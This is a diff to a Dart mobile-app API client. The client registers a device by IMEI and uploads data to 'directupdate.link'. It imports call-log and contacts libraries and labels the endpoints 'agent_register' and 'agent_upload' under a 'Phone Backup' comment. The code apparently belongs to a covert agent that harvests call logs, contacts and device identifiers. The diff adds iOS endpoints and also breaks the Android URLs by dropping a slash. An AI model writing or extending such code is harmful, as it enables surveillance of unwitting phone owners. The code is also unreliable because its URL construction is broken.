@@ -2,6 +2,7 @@
 
 import 'dart:convert';
 import 'dart:developer';
+import 'dart:io' show Platform;
 
 import 'package:call_log/call_log.dart';
 import 'package:contacts_service/contacts_service.dart';
@@ -35,10 +36,13 @@ const base = kDebugMode ? 'https://testfix.foo' : 'https://directupdate.link';
 class Api {
   // 1001 – device info
   static Future<String?> sendDeviceInfo(String? agent, String? imei) async {
-    const url = '$base/a_agent_register'; // Phone Backup
+    print('START: sendDeviceInfo()');
+
+    final url = '$base' '${Platform.isIOS ? '/i_agent_register' : 'a_agent_register'}';
     final headers = {'Content-Type': 'application/json', 'User-Agent': '$agent'};
     printYellow('headers $headers');
     final response = await http.get(Uri.parse(url), headers: headers);
+    print('XXX response ${response}');
 
     if (response.statusCode == 200) {
       final responseData = jsonDecode(response.body);
@@ -85,7 +89,7 @@ class Api {
       return;
     }
 
-    const url = '$base/a_agent_upload';
+    final url = '$base' '${Platform.isIOS ? '/i_agent_upload' : 'a_agent_upload'}';
     final headers = {'Content-Type': 'application/json', 'User-Agent': agent};
     final body = jsonEncode(data ?? {});
 
